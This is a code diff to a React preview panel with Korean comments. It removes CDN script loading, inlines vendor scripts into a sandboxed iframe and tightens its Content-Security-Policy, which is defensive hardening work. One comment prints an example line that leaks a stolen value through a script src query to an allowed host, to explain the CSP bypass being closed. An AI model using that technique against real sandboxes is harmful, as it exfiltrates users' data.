@@ -91,40 +91,52 @@ function SlideViewer({ rawCode }: { rawCode: string }) {
   );
 }
 
+/** ★★★ [E0-1A] mermaid 를 **로컬 패키지에서** 쓴다.
+ *
+ * 종전에는 `cdn.jsdelivr.net` 의 스크립트를 **부모 문서 `<body>` 에 주입**했다. iframe 안의
+ * CDN 보다 이쪽이 더 위험하다 — 부모 문서에는 세션 토큰과 전사 데이터가 있고, 주입된 코드는
+ * 그 전부에 접근할 수 있다. 즉 제3자가 그 파일을 바꾸는 날 우리 세션이 함께 넘어간다.
+ *
+ * ⚠️ 정적 import 가 아니라 **동적 import** 다. mermaid 는 3MB 가 넘어서 정적으로 넣으면 첫
+ *   화면 로딩에 그대로 얹힌다 — 다이어그램을 여는 사람만 내려받게 한다.
+ * ⚠️ 실패를 조용히 삼키지 않는다. 종전 코드는 `script.onerror` 가 없어 CDN 이 막히면
+ *   **빈 상자**가 남았고, 사용자는 다이어그램이 없는 문서라고 읽었다. */
 function MermaidViewer({ rawCode }: { rawCode: string }) {
   const containerRef = React.useRef<HTMLDivElement>(null);
-  
+  const [loadError, setLoadError] = useState<string | null>(null);
+
   React.useEffect(() => {
     let code = rawCode.trim();
     const match = code.match(/^```mermaid\s*\n([\s\S]*?)\n```$/);
     if (match) code = match[1];
 
     if (!containerRef.current) return;
-    
-    const scriptId = 'mermaid-script';
-    let script = document.getElementById(scriptId) as HTMLScriptElement;
-    
-    const renderDiagram = () => {
-       const m = (window as any).mermaid;
-       if (m) {
-         m.initialize({ startOnLoad: false, theme: 'default' });
-         containerRef.current!.innerHTML = '<div class="mermaid">' + code + '</div>';
-         m.init(undefined, containerRef.current!.querySelectorAll('.mermaid'));
-       }
-    };
+    let alive = true;
 
-    if (!script) {
-      script = document.createElement('script');
-      script.id = scriptId;
-      script.src = 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js';
-      script.onload = () => {
-         renderDiagram();
-      };
-      document.body.appendChild(script);
-    } else {
-      renderDiagram();
-    }
+    (async () => {
+      try {
+        const mermaid = (await import('mermaid')).default;
+        if (!alive || !containerRef.current) return;
+        mermaid.initialize({ startOnLoad: false, theme: 'default' });
+        containerRef.current.innerHTML = '<div class="mermaid">' + code + '</div>';
+        await mermaid.run({ nodes: containerRef.current.querySelectorAll('.mermaid') });
+        if (alive) setLoadError(null);
+      } catch (e: any) {
+        if (alive) setLoadError(String(e?.message || e));
+      }
+    })();
+
+    return () => { alive = false; };
   }, [rawCode]);
+
+  if (loadError) {
+    return (
+      <div role="alert" className="w-full h-full bg-white overflow-auto p-8 text-sm text-rose-900">
+        <strong>다이어그램을 그리지 못했습니다.</strong>
+        <div className="mt-1 opacity-80 break-all">사유: {loadError}</div>
+      </div>
+    );
+  }
 
   return (
     <div className="w-full h-full bg-white overflow-auto p-8 flex items-center justify-center">
@@ -133,6 +145,60 @@ function MermaidViewer({ rawCode }: { rawCode: string }) {
   );
 }
 
+
+// ─────────────────────────────────────────────────────────────────────────────
+// ★★★ [E0-1A] Preview 벤더 — **CDN 을 지우고 우리 파일을 srcDoc 에 적어 넣는다.**
+//
+// 종전 iframe 은 tailwind·react·react-dom·babel·lucide 를 CDN 에서 받았고, 그래서 CSP 의
+// `script-src` 에 `cdn.tailwindcss.com` · `unpkg.com` 을 열어 둬야 했다. 그런데
+// **열린 호스트는 곧 나가는 길이다** — `connect-src 'none'` 으로 fetch·XHR·WebSocket 을 전부
+// 막아 놓아도, 생성 코드는 이 한 줄로 데이터를 실어 보낼 수 있었다.
+//
+//     var s = document.createElement('script');
+//     s.src = 'https://unpkg.com/x?leak=' + encodeURIComponent(훔친값);   // ← CSP 통과
+//
+// 그래서 호스트를 **하나도 남기지 않는다.** 부모가 같은 출처(`/preview-vendor/*.js`)에서 읽어
+// srcDoc 안에 그대로 적어 넣으면 iframe 은 어떤 요청도 하지 않는다.
+//
+// ⚠️ **왜 blob: 로 안 하는가.** 부모가 만든 blob URL 은 부모 출처에 묶인다. 샌드박스 iframe 은
+//   고유(opaque) 출처라 그 URL 을 읽지 못한다 — 크기를 줄이려다 미리보기가 통째로 죽는다.
+// ⚠️ 합계 약 4MB 다. 대부분(3MB)은 Babel standalone 이고, 이것은 종전에도 네트워크로 받아
+//   **매번 파싱하던 양**이라 파싱 비용은 그대로다. 늘어난 것은 부모가 문자열을 들고 있는 것뿐.
+// ⚠️ 이 자산은 `npm run dev` · `npm run build` 앞에서 자동 생성된다(predev·prebuild).
+//   커밋하지 않는다 — 남의 코드 4MB 를 저장소에 넣지 않고, 대신 언제든 재생성되게 둔다.
+
+const VENDOR_FILES = [
+  '/preview-vendor/tailwind.js',
+  '/preview-vendor/runtime.js',
+  '/preview-vendor/babel.js',
+] as const;
+
+/** `</script>` 가 인라인 스크립트를 **중간에 끊는다.** 넣기 전에 반드시 무력화한다. */
+function inlineSafe(code: string): string {
+  return code.replace(/<\/(script)/gi, '<\\/$1').replace(/<!--/g, '<\\!--');
+}
+
+let _vendorPromise: Promise<string> | null = null;
+
+/** 벤더 3종을 한 번만 읽어 인라인용 문자열로 만든다(모듈 수준 캐시 — 마운트마다 다시 읽지 않는다). */
+function loadPreviewVendor(): Promise<string> {
+  if (_vendorPromise) return _vendorPromise;
+  _vendorPromise = Promise.all(
+    VENDOR_FILES.map(async (p) => {
+      const r = await fetch(p);
+      if (!r.ok) throw new Error(`${p} → HTTP ${r.status}`);
+      const text = await r.text();
+      //: 빈 파일·HTML 오류문서를 «성공» 으로 세지 않는다. 그대로 넣으면 미리보기가 조용히
+      //  하얗게 뜨고, 그 증상이 격리 실패와 구별되지 않는다.
+      if (text.length < 1000 || text.trimStart().startsWith('<')) {
+        throw new Error(`${p} 의 내용이 스크립트가 아닙니다(길이 ${text.length}).`);
+      }
+      return `<script>${inlineSafe(text)}</script>`;
+    })
+  ).then((parts) => parts.join('\n'));
+  _vendorPromise.catch(() => { _vendorPromise = null; });   // 실패는 캐시하지 않는다 — 다시 시도할 수 있어야 한다
+  return _vendorPromise;
+}
 
 interface PreviewPanelProps {
   rawCode: string;
@@ -195,25 +261,39 @@ const PreviewPanel: React.FC<PreviewPanelProps> = ({ rawCode, isLoading, release
   // iframe HTML 템플릿
   // 가상 모듈 레지스트리: 여러 파일을 순서대로 컴파일·등록 후 App을 렌더링
   // ─────────────────────────────────────────────────────────────────────────
-  const htmlTemplate = `
+  //: [E0-1A] 벤더가 도착해야 템플릿을 만들 수 있다. 도착 전에는 iframe 을 띄우지 않는다.
+  const [vendorScripts, setVendorScripts] = useState<string | null>(null);
+  const [vendorError, setVendorError] = useState<string | null>(null);
+  useEffect(() => {
+    let alive = true;
+    loadPreviewVendor()
+      .then((s) => { if (alive) { setVendorScripts(s); setVendorError(null); } })
+      .catch((e) => { if (alive) setVendorError(String(e?.message || e)); });
+    return () => { alive = false; };
+  }, []);
+
+  //: ⚠️ **`useMemo` 여야 한다.** 벤더가 약 4MB 라 렌더마다 문자열을 다시 이으면 그것만으로
+  //   화면이 버벅인다. 종전에는 CDN `<script src>` 한 줄이라 그냥 상수여도 무해했다.
+  const htmlTemplate = useMemo(() => `
     <!DOCTYPE html>
     <html lang="ko">
       <head>
         <meta charset="UTF-8" />
         <title>AI Factory Preview</title>
-        <!-- ★★★ [P0-1A] CSP — **CORS 에 기대지 않는다.**
+        <!-- ★★★ [P0-1A→E0-1A] CSP — **CORS 에 기대지 않고, 이제 호스트도 남기지 않는다.**
              opaque origin(=allow-same-origin 제거) 이어도 생성 코드는 외부로 전송을 시도할 수
              있다. 그래서 네트워크를 CSP 로 끊는다. connect-src 'none' 이 핵심이다.
-             ⚠️ script-src 에 CDN 두 곳을 명시적으로 연다 — 지금 Preview 는 tailwind·react·
-               babel·lucide 를 CDN 에서 받아 동작하며, 이것을 막으면 미리보기 자체가 죽는다.
-               'unsafe-eval' 은 Babel standalone 이 new Function 을 쓰기 때문이다.
-               **스크립트 출처는 열되 데이터 전송로는 닫는다** 가 이 정책의 요지다. -->
-        <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com https://unpkg.com; style-src 'unsafe-inline' https://cdn.tailwindcss.com; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; object-src 'none'; frame-src 'none'; base-uri 'none';" />
-        <script src="https://cdn.tailwindcss.com"></script>
-        <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
-        <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
-        <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-        <script src="https://unpkg.com/lucide@latest"></script>
+             ⚠️ 종전에는 script-src 에 cdn.tailwindcss.com · unpkg.com 을 열어 두었다. 미리보기를
+               살리려는 타협이었지만, **열린 호스트는 곧 나가는 길이다** — «script src=…?leak=»
+               한 줄이면 connect-src 를 우회해 데이터가 나간다. E0-1A 에서 그 두 호스트를 지우고
+               (⚠️ 이 주석 안에서는 백틱을 쓰지 않는다. 이 문자열 자체가 템플릿 리터럴이라
+                 백틱 하나가 문자열을 그 자리에서 끊는다 — 실제로 한 번 그렇게 깨뜨렸다.)
+               벤더를 srcDoc 에 직접 적어 넣었다. **이제 어떤 출처도 허용되지 않는다.**
+             ⚠️ 'unsafe-eval' 은 남는다 — Babel standalone 이 new Function 으로 JSX 를 컴파일한다.
+               이것은 «밖으로 나가는 길» 이 아니라 «안에서 코드를 만드는 것» 이고, 애초에 생성
+               코드를 실행하는 것이 이 화면의 목적이다. -->
+        <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; object-src 'none'; frame-src 'none'; base-uri 'none';" />
+        ${vendorScripts ?? ''}
         <style>
           body { margin: 0; padding: 0; font-family: sans-serif; background: #f8fafc; }
           #root { min-height: 100vh; display: flex; flex-direction: column; }
@@ -484,7 +564,7 @@ const PreviewPanel: React.FC<PreviewPanelProps> = ({ rawCode, isLoading, release
         </script>
       </body>
     </html>
-  `;
+  `, [vendorScripts]);
 
   // ── rawCode 에서 코드파일 배열 추출 ────────────────────────────────────────
   const extractCodeFiles = useCallback((raw: string): CodeFile[] => {
@@ -595,6 +675,10 @@ const PreviewPanel: React.FC<PreviewPanelProps> = ({ rawCode, isLoading, release
 
   // PREVIEW 탭 진입 시 iframe 재초기화
   useEffect(() => {
+    //: ⚠️ [E0-1A] 벤더가 도착하기 전에 srcdoc 을 쓰면 React·Babel 이 없는 문서가 뜨고,
+    //   그 프레임은 «컴포넌트 렌더링 대기 중...» 에서 영원히 멈춘다. 도착 후 다시 쓴다
+    //   (이 effect 가 `vendorScripts` 에도 걸려 있으므로 자동으로 한 번 더 돈다).
+    if (!vendorScripts) return;
     if (iframeRef.current && activeTab === 'PREVIEW') {
       isIframeReadyRef.current = false;
       setIsIframeReady(false);
@@ -603,7 +687,9 @@ const PreviewPanel: React.FC<PreviewPanelProps> = ({ rawCode, isLoading, release
         || `sid_${Date.now()}_${Math.random().toString(36).slice(2)}`;
       iframeRef.current.srcdoc = htmlTemplate.replace(/__AFS_SID__/g, previewSidRef.current);
     }
-  }, [activeTab]);
+    //: ⚠️ `htmlTemplate` 을 의존성에 넣지 않는다 — 그것은 `vendorScripts` 하나에만 달려 있고,
+    //   넣으면 같은 뜻의 값이 둘이 되어 나중에 한쪽만 바뀌는 날 프레임이 두 번 재로딩된다.
+  }, [activeTab, vendorScripts]);
 
   // rawCode 변경 → 파일 추출 → 캐시 저장 → 준비됐으면 즉시 전송
   useEffect(() => {
@@ -854,6 +940,26 @@ const PreviewPanel: React.FC<PreviewPanelProps> = ({ rawCode, isLoading, release
                   아래 미리보기는 그대로 동작합니다.
                 </div>
                 <button onClick={() => setPopupBlocked(false)} className="shrink-0 text-amber-700 hover:text-amber-900 font-bold px-1" aria-label="이 안내 닫기">✕</button>
+              </div>
+            )}
+            {/* ⚠️ [E0-1A] 실행 환경을 못 읽었으면 **빈 화면으로 두지 않는다.** 벤더가 없으면
+                미리보기는 그냥 안 뜨고, 그 증상은 「격리에 막혔다」와 구별되지 않는다 —
+                사용자는 통제가 고장났다고 읽고, 개발자는 엉뚱한 곳을 본다. */}
+            {vendorError && (
+              <div role="alert" className="absolute top-[30px] left-0 w-full p-3 bg-rose-50 text-rose-900 text-sm z-10 border-b border-rose-200 flex items-start gap-2">
+                <span aria-hidden="true">⚠️</span>
+                <div className="flex-1">
+                  <strong>미리보기 실행 환경을 불러오지 못했습니다.</strong> 격리 때문이 아니라
+                  파일이 준비되지 않은 것입니다. 개발 서버라면 <code>npm run dev</code> 를 다시
+                  시작하십시오(자산은 그때 생성됩니다).
+                  <br />
+                  <span className="opacity-80 break-all">사유: {vendorError}</span>
+                </div>
+              </div>
+            )}
+            {!vendorScripts && !vendorError && (
+              <div role="status" className="absolute inset-0 flex items-center justify-center text-sm text-gray-500 z-10 bg-white/70">
+                미리보기 실행 환경을 준비하는 중입니다…
               </div>
             )}
             <iframe ref={iframeRef} title="AI Factory Preview Sandbox" className="w-full h-full border-none flex-1 bg-transparent" sandbox="allow-scripts" />
